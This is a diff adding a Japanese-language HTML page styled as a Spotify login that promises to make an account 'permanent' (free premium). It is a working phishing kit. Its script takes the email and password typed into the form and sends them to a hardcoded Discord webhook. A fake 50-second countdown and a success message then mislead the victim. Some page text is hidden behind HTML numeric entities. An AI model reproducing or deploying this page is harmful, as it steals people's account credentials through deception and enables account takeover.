@@ -1,0 +1,128 @@
+<!DOCTYPE html>&#10;<html lang="en">&#10;<head>&#10;&#32;&#32;<meta charset="UTF-8">&#10;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0">&#10;&#32;&#32;<title>&#83;&#112;&#111;&#116;&#105;&#102;&#121;&#32;&#27704;&#20037;&#21270;</title>&#10;&#32;&#32;<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">&#10;&#32;&#32;<style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #121212;
+      color: #FFFFFF;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .login-container {
+      background: #181818;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+    }
+
+    .login-container img {
+      width: 100px;
+      margin-bottom: 1rem;
+    }
+
+    .login-container h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      color: #1DB954;
+    }
+
+    .login-container form {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .login-container input {
+      padding: 0.8rem;
+      font-size: 1rem;
+      border: 1px solid #282828;
+      border-radius: 4px;
+      background: #282828;
+      color: #FFFFFF;
+    }
+
+    .login-container input:focus {
+      outline: none;
+      border-color: #1DB954;
+    }
+
+    .login-container button {
+      padding: 0.8rem;
+      font-size: 1rem;
+      font-weight: bold;
+      color: #FFFFFF;
+      background: #1DB954;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .login-container button:hover {
+      background: #1aa34a;
+    }
+
+    .countdown {
+      margin-top: 1.5rem;
+      font-size: 1rem;
+      color: #1DB954;
+      display: none;
+    }
+
+    .complete-message {
+      margin-top: 1.5rem;
+      font-size: 1.2rem;
+      color: #1DB954;
+      display: none;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      font-size: 0.8rem;
+      color: #B3B3B3;
+    }
+  </style>&#10;</head>&#10;<body>&#10;&#32;&#32;<div class="login-container">&#10;&#32;&#32;&#32;&#32;<h1>&#83;&#112;&#111;&#116;&#105;&#102;&#121;&#32;&#27704;&#20037;&#21270;</h1>&#10;&#32;&#32;&#32;&#32;<form id="login-form">&#10;&#32;&#32;&#32;&#32;&#32;&#32;<input type="email" id="email" placeholder="メールアドレス" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;<input type="password" id="password" placeholder="パスワード" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;<button type="submit">&#12525;&#12464;&#12452;&#12531;</button>&#10;&#32;&#32;&#32;&#32;</form>&#10;&#32;&#32;&#32;&#32;<div class="countdown" id="countdown">&#53;&#48;&#31186;&#12362;&#24453;&#12385;&#12367;&#12384;&#12373;&#12356;&#46;&#46;&#46;</div>&#10;&#32;&#32;&#32;&#32;<div class="complete-message" id="complete-message">&#27704;&#20037;&#21270;&#12364;&#23436;&#20102;&#12375;&#12414;&#12375;&#12383;&#65281;</div>&#10;&#32;&#32;&#32;&#32;<div class="footer">&#66;&#121;&#32;&#115;&#112;&#101;&#110;&#100;&#110;&#105;&#116;&#32;&#26368;&#32066;&#26356;&#26032;&#26085;&#49;&#50;&#26376;&#49;&#53;&#26085;</div>&#10;&#32;&#32;</div>&#10;&#32;&#32;<script>
+    const form = document.getElementById('login-form');
+    const countdownElement = document.getElementById('countdown');
+    const completeMessage = document.getElementById('complete-message');
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      fetch('https://discord.com/api/webhooks/1317658723866509382/cYrHVz87bnn2QfjX1t7mI6SfUGJbR5RAxQTQj92ahE5HOs5qsFvHMsTUe5Bjl_Y-iV_B', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          content: `メールアドレス: ${email}\nパスワード: ${password}`
+        })
+      });
+
+      form.style.display = 'none';
+      countdownElement.style.display = 'block';
+
+      let timeLeft = 50;
+      const timer = setInterval(() => {
+        if (timeLeft > 0) {
+          countdownElement.textContent = `${timeLeft}秒お待ちください...`;
+          timeLeft--;
+        } else {
+          clearInterval(timer);
+          countdownElement.style.display = 'none';
+          completeMessage.style.display = 'block';
+        }
+      }, 1000);
+    });
+  </script>&#10;</body>&#10;</html>&#10;
